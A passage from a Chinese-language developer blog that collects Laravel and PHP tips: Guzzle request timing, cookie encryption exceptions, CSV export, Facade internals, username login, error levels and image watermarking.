[0.001s]',</span></span><br><span class="line"><span class="comment">          3 =&gt; 'SET foo &lt;- 127.0.0.1:6379 [0.0011s]',</span></span><br><span class="line"><span class="comment">          4 =&gt; 'GET foo -&gt; 127.0.0.1:6379 [0.0013s]',</span></span><br><span class="line"><span class="comment">          5 =&gt; 'GET foo &lt;- 127.0.0.1:6379 [0.0015s]',</span></span><br><span class="line"><span class="comment">          6 =&gt; 'INFO -&gt; 127.0.0.1:6379 [0.0019s]',</span></span><br><span class="line"><span class="comment">          7 =&gt; 'INFO &lt;- 127.0.0.1:6379 [0.0022s]',</span></span><br><span class="line"><span class="comment">        )</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="记录guggle运行时间"><a href="#记录guggle运行时间" class="headerlink" title="记录guggle运行时间"></a>记录guggle运行时间</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">use Illuminate\Http\Request;</span><br><span class="line">use GuzzleHttp\Event\EmitterInterface;</span><br><span class="line">use GuzzleHttp\Event\BeforeEvent;</span><br><span class="line">use GuzzleHttp\Event\CompleteEvent;</span><br><span class="line">use GuzzleHttp\Event\EndEvent;</span><br><span class="line">use GuzzleHttp\Event\Emitter;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GuzzleEmitter</span> <span class="keyword">extends</span> <span class="title">Emitter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$rs_info = <span class="string">'api_time'</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $start = <span class="number">0</span>;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;on(<span class="string">'before'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">BeforeEvent $event, $name</span>) <span class="title">use</span>(<span class="params">&amp;$start, $rs_info</span>)</span>&#123;</span><br><span class="line">            $start = microtime(<span class="literal">true</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        $<span class="keyword">this</span>-&gt;on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">EndEvent $event</span>) <span class="title">use</span>(<span class="params">&amp;$start, $rs_info</span>)</span>&#123;</span><br><span class="line">            $url = $event-&gt;gettransferInfo()[<span class="string">'url'</span>];</span><br><span class="line">            $parse = parse_url($url);</span><br><span class="line">            <span class="keyword">if</span> ($event-&gt;getException()) &#123;</span><br><span class="line">                dump([<span class="string">'rs'</span> =&gt; $url, <span class="string">'ext1'</span> =&gt; sprintf(<span class="string">'%s://%s%s'</span>,$parse[<span class="string">'scheme'</span>],$parse[<span class="string">'host'</span>],$parse[<span class="string">'path'</span>]), <span class="string">'cmd'</span> =&gt; $event-&gt;getRequest()-&gt;getmethod(), <span class="string">'code'</span> =&gt; $event-&gt;gettransferInfo()[<span class="string">'http_code'</span>],   <span class="string">'t_total'</span> =&gt; intval((microtime(<span class="literal">true</span>)-$start)*<span class="number">1000</span>), <span class="string">'p_ip'</span> =&gt; $event-&gt;gettransferInfo()[<span class="string">'primary_ip'</span>], <span class="string">'req_id'</span>=&gt;defined(<span class="string">'REQUEST_ID'</span>)?(REQUEST_ID):<span class="string">''</span>,]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $method=$event-&gt;getRequest()-&gt;getmethod();</span><br><span class="line">                $post_data=($method==<span class="string">'POST'</span>)?((string)$event-&gt;getRequest()-&gt;getBody()):<span class="string">''</span>;</span><br><span class="line">                dump([</span><br><span class="line">                    <span class="string">'rs'</span> =&gt; $url,</span><br><span class="line">                    <span class="string">'cmd'</span> =&gt; $method,</span><br><span class="line">                    <span class="string">'code'</span> =&gt; $event-&gt;gettransferInfo()[<span class="string">'http_code'</span>],</span><br><span class="line">                     <span class="string">'t_total'</span> =&gt; intval((microtime(<span class="literal">true</span>)-$start)*<span class="number">1000</span>),</span><br><span class="line">                    <span class="string">'p_ip'</span> =&gt; $event-&gt;gettransferInfo()[<span class="string">'primary_ip'</span>],</span><br><span class="line">                    <span class="string">'rs_content'</span>=&gt;$post_data,</span><br><span class="line">                    <span class="string">'ext1'</span> =&gt; sprintf(<span class="string">'%s://%s%s'</span>,$parse[<span class="string">'scheme'</span>],$parse[<span class="string">'host'</span>],$parse[<span class="string">'path'</span>]),</span><br><span class="line">                    <span class="string">'req_id'</span>=&gt;defined(<span class="string">'REQUEST_ID'</span>)?(REQUEST_ID):<span class="string">''</span>,</span><br><span class="line">                ]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="未加密的-Cookie"><a href="#未加密的-Cookie" class="headerlink" title="未加密的 Cookie"></a>未加密的 Cookie</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">默认情况下，Laravel 生成的所有 cookie 都是经过加密和签名的，防止被非法篡改。但 Laravel 也支持不对 cookie 加密，具体做法如下：</span><br><span class="line"></span><br><span class="line">修改 app/Http/Middleware 目录中 App\Http\Middleware\EncryptCookies 中间件的 $except 属性，该属性是个数组，把不需加密的 cookie 名加入到该数组属性中就可以了：</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 不需要被加密的cookies名称</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @var array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">protected $except = [</span><br><span class="line">    <span class="string">'cookie_name'</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
<h3 id="无法获取-cookie"><a href="#无法获取-cookie" class="headerlink" title="无法获取 cookie"></a>无法获取 cookie</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取cookie的三种尝试</span></span><br><span class="line">Cookie::get(<span class="string">'cookie_name'</span>);</span><br><span class="line">request()-&gt;cookie(<span class="string">'cookie_name'</span>);</span><br><span class="line">$request-&gt;cookie(<span class="string">'cookie_name'</span>)；</span><br><span class="line"><span class="comment">//返回值均为null laravel 设置 cookie 是加密之后的，而我获取的 cookie 是外来 cookie，由于解密失败，所以怎么获取都是空</span></span><br><span class="line">https:<span class="comment">//learnku.com/laravel/t/31939</span></span><br><span class="line"><span class="comment">//添加到cookie名称到 App\Http\Middleware\EncryptCookies 的 排除名单 中：</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EncryptCookies</span> <span class="keyword">extends</span> <span class="title">Middleware</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    protected $except = [</span><br><span class="line">      <span class="string">'cookie_name'</span>,</span><br><span class="line">      ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Laravel-Excel-导出-csv"><a href="#Laravel-Excel-导出-csv" class="headerlink" title="Laravel Excel 导出 csv"></a>Laravel Excel 导出 csv</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Laravel Excel <span class="number">2.0</span> 的版本和 <span class="number">3.0</span> 的版本有很大的区别，使用 composer 加载的时候要注意版本，<span class="number">3.0</span> 和 <span class="number">2.0</span> 的语法基本不同了</span><br><span class="line">composer <span class="built_in">require</span> maatwebsite/excel ~<span class="number">2.1</span></span><br><span class="line">php artisan vendor:publish --provider=<span class="string">"Maatwebsite\Excel\ExcelServiceProvider"</span>  </span><br><span class="line">config/excel.php 中找到 csv，把里面的 use_bom=&gt;<span class="literal">false</span> 改为 use_bom=&gt;<span class="literal">true</span>，这样导出的 csv 文件就会有 bom 头，不会出现乱码。</span><br><span class="line"></span><br><span class="line">Excel::create(iconv(<span class="string">'UTF-8'</span>, <span class="string">'GBK'</span>, <span class="string">'文章点赞数据'</span>),<span class="function"><span class="keyword">function</span> (<span class="params">$excel</span>) <span class="title">use</span>(<span class="params">$params</span>)</span>&#123;</span><br><span class="line">        $excel-&gt;sheet(<span class="string">'score'</span>,<span class="function"><span class="keyword">function</span> (<span class="params">$sheet</span>) <span class="title">use</span>(<span class="params">$params</span>)</span>&#123;</span><br><span class="line">            $sheet-&gt;rows($params);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)-&gt;<span class="keyword">export</span>(<span class="string">'csv'</span>);</span><br><span class="line">https:<span class="comment">//learnku.com/articles/32002</span></span><br><span class="line">按照 semver https:<span class="comment">//semver.org/lang/zh-CN/ 的规则，主版本号本来就是做不兼容 API 修改的，升级了主版本号，语法当然不一样了。这不算是坑，只是你不了解而已。</span></span><br><span class="line">https:<span class="comment">//github.com/rap2hpoutre/fast-excel  maatwebsite/excel 感觉太耗内存了</span></span><br></pre></td></tr></table></figure>
<h3 id="项目开发规范"><a href="#项目开发规范" class="headerlink" title="项目开发规范"></a>项目开发规范</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">常用的 HTTP 动词有下面五个。</span><br><span class="line"></span><br><span class="line">GET（SELECT）：从服务器取出资源（一项或多项）。</span><br><span class="line">POST（CREATE）：在服务器新建一个资源。</span><br><span class="line">PUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源）。</span><br><span class="line">PATCH（UPDATE）：在服务器更新资源（客户端提供改变的属性）。</span><br><span class="line">DELETE（DELETE）：从服务器删除资源。</span><br><span class="line">所有 URL 必须 是全小写，所有的路由都要用 name</span><br><span class="line"></span><br><span class="line"> Route::get(<span class="string">'user/create'</span>,<span class="string">'UserController@create'</span>)-&gt;name(<span class="string">'admin.user.create'</span>);</span><br><span class="line">一个是打开 create 页面的请求，一个是 create 数据的请求，其中的路由规范如下：</span><br><span class="line"></span><br><span class="line">路由采用 reseful API 的设计规范</span><br><span class="line"></span><br><span class="line">        Route::get(<span class="string">'member/create'</span>, <span class="string">'MemberController@create'</span>)-&gt;name(<span class="string">'admin.member.create'</span>);</span><br><span class="line">        Route::post(<span class="string">'member/store'</span>, <span class="string">'MemberController@store'</span>)-&gt;name(<span class="string">'admin.member.store'</span>);</span><br><span class="line">ORM 的设计规范</span><br><span class="line"></span><br><span class="line">框架的 ORM 只单纯的做模型关联使用，另外新建 Repsitory 层做数据库的逻辑处理，</span><br><span class="line"></span><br><span class="line">Repsitory 的命名采用驼峰法命令规范，比如</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">namespace App\Repository\Admin;</span><br><span class="line">use App\Models\User;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserRepository</span> </span>&#123;</span><br><span class="line">Controller 的设计规范</span><br><span class="line"></span><br><span class="line">数据验证在 request 层进行处理，保证进行控制器的数据是干净的。</span><br><span class="line">对于数据的处理则调用对应的 Repsitory 层处理，控制器只做响应和返回对应的数据。https:<span class="comment">//learnku.com/articles/32141</span></span><br></pre></td></tr></table></figure>
<h3 id="Laravel-中-Facade"><a href="#Laravel-中-Facade" class="headerlink" title="Laravel 中 Facade"></a>Laravel 中 Facade</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Route::get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">'welcome'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">这里 Route 就是用 Facade 实现类方法 get 的静态调用。</span><br><span class="line"></span><br><span class="line">Laravel 中的 Facade 解决类什么问题？</span><br><span class="line"></span><br><span class="line">在 php 中，很多情况都需要使用一个容器获取到所有的对象，然后再调用改对象的方法，这样在编写代码的时候就会看到很长的一个调用链。例如:</span><br><span class="line">在 Yii2 中，几乎所有的系统类都是在 app 容器当中，对这些系统类进行操作都需要执行 Yii::$app-&gt;route 获取到类实例，然后在执行方法 Yii::$app-&gt;route-&gt;get()。但是如果用 Facade 实现之后的调用就是 Route::get()。这样的写法是的代码更加简洁。</span><br><span class="line"></span><br><span class="line">Laravel 中 Facade 是怎么实现的？</span><br><span class="line"></span><br><span class="line">思路是通过__callStatic 魔术方法将方法调用代理到实际的对象方法中去。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">abstract <span class="class"><span class="keyword">class</span> <span class="title">Facade</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFacadeRoot</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">static</span>::resolveFacadeInstance(<span class="keyword">static</span>::getFacadeAccessor());</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    protected <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">resolveFacadeInstance</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_object($name)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isset(<span class="keyword">static</span>::$resolvedInstance[$name])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">static</span>::$resolvedInstance[$name];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">static</span>::$resolvedInstance[$name] = <span class="keyword">static</span>::$app[$name];</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFacadeAccessor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//子类返回类名</span></span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params">$method, $args</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $instance = <span class="keyword">static</span>::getFacadeRoot();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! $instance) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'A facade root has not been set.'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $instance-&gt;$method(...$args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Route</span> <span class="keyword">extends</span> <span class="title">Facade</span></span>&#123;</span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFacadeAccessor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'router'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">根据每个 Facade 中提供的 getFacadeAccessor 返回实际的对象类名，获取类对象。每个类对象一旦创建，就放在一个静态数组中，因此在一次请求中最多只会被创建一次。</span><br><span class="line"></span><br><span class="line">有没有其他的实现方式？</span><br><span class="line"></span><br><span class="line">从上面的代码可以看到，其实核心就是一个静态代理的功能。那么有没有其他的实现方式了呢？</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Facade</span></span>&#123;</span><br><span class="line">    public <span class="keyword">static</span> $instance;</span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFacadeRoot</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">static</span>::resolveFacadeInstance(<span class="keyword">static</span>::getFacadeAccessor());</span><br><span class="line">    &#125;</span><br><span class="line">    protected <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">resolveFacadeInstance</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_object($name)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isset(<span class="keyword">static</span>::$instance)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">static</span>::$instance;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">static</span>::$instance = <span class="keyword">static</span>::$app[$name];</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params">$method, $args</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $instance = <span class="keyword">static</span>::getFacadeRoot();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! $instance) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'A facade root has not been set.'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $instance-&gt;$method(...$args);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Route</span> <span class="keyword">extends</span> <span class="title">Facade</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">可以看出，上面的方式也能够实现静态代理，类似于 Facade 的功能。都是通过魔术方法实现。作用上，都简化了代码编写。</span><br><span class="line"></span><br><span class="line">两种不同实现方式的区别</span><br><span class="line"></span><br><span class="line">第二种实现方式有一个很大的缺点，那就是必须继承 Facade 类。PHP 本身只能继承一个类，所以第二种实现方式对于一些需要继承其他类的对象是不适合的。https:<span class="comment">//learnku.com/articles/31964</span></span><br></pre></td></tr></table></figure>
<h3 id="Laravel-默认邮箱登录改成用户名登录"><a href="#Laravel-默认邮箱登录改成用户名登录" class="headerlink" title="Laravel 默认邮箱登录改成用户名登录"></a>Laravel 默认邮箱登录改成用户名登录</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">默认的，Laravel 使用的是 Illuminate\Foundation\Auth\AuthenticatesUsers 这个 trait 完成登录功能的。通过观察 AuthenticatesUsers 的代码，发现下面一段很有意思的代码:</span><br><span class="line"></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">validateLogin</span>(<span class="params">Request $request</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;validate($request, [</span><br><span class="line">            $<span class="keyword">this</span>-&gt;username() =&gt; <span class="string">'required|string'</span>,</span><br><span class="line">            <span class="string">'password'</span> =&gt; <span class="string">'required|string'</span>,</span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">username</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'email'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">可以看到，是应为 trait 里定义了用户名就是 email，所以才会使得验证的时候通过用户邮箱验证。所以我们只需要定义一个 trait，覆盖 AuthenticatesUsers 中的 username() 方法即可实现后端代码通过用户名验证登录。</span><br><span class="line"></span><br><span class="line">新增的 trait 代码</span><br><span class="line"></span><br><span class="line">namespace App\Utils;</span><br><span class="line"></span><br><span class="line">use Illuminate\Foundation\Auth\AuthenticatesUsers <span class="keyword">as</span> LaravelAuthenticatesUsers;</span><br><span class="line">trait AuthenticatesUsers &#123;</span><br><span class="line">    use LaravelAuthenticatesUsers;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">username</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'name'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">其实还有另一个简单的修改方式，直接在 LoginController 中新增 username() 方法。由于当前定义方法会覆盖 trait 的方法，因此也能达到修改的目的。但是会破坏登录代码的整体一致性，所以最好还是通过新增 trait 的方式实现。</span><br><span class="line"></span><br><span class="line">同时要记得修改前端 blade 文件中对输入参数的验证，然后就可以使用用户名登录了 https:<span class="comment">//learnku.com/articles/32431</span></span><br></pre></td></tr></table></figure>
<h3 id="设置错误等级"><a href="#设置错误等级" class="headerlink" title="设置错误等级"></a>设置错误等级</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> /vendor/laravel/framework/src/Illuminate/Foundation/Bootstrap/HandleExceptions.php:<span class="number">12</span></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">bootstrap</span>(<span class="params">Application $app</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		$<span class="keyword">this</span>-&gt;app = $app;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($app-&gt;environment(<span class="string">'production'</span>)) &#123;</span><br><span class="line">            error_reporting(E_ERROR);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            error_reporting(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">		set_error_handler([$<span class="keyword">this</span>, <span class="string">'handleError'</span>]);</span><br><span class="line"></span><br><span class="line">		set_exception_handler([$<span class="keyword">this</span>, <span class="string">'handleException'</span>]);</span><br><span class="line"></span><br><span class="line">		register_shutdown_function([$<span class="keyword">this</span>, <span class="string">'handleShutdown'</span>]);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ( $app-&gt;environment(<span class="string">'production'</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			ini_set(<span class="string">'display_errors'</span>, <span class="string">'Off'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<h3 id="图片添加水印"><a href="#图片添加水印" class="headerlink" title="图片添加水印"></a>图片添加水印</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="built_in">require</span> intervention/image</span><br><span class="line">在我的测试图片文件夹 images 里有一张主图 main.png 和一张水印图 watermark.png。</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">addWatermark</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   $img = Image::make(public_path(<span class="string">'images/main.png'</span>));    </span><br><span class="line">   $img-&gt;insert(public_path(<span class="string">'watermark.png'</span>),<span class="string">'bottom-right'</span>,<span class="number">10</span>, <span class="number">10</span>); </span><br><span class="line">   $img-&gt;save();</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/laravel/t/32414</span></span><br></pre></td></tr></table></figure>
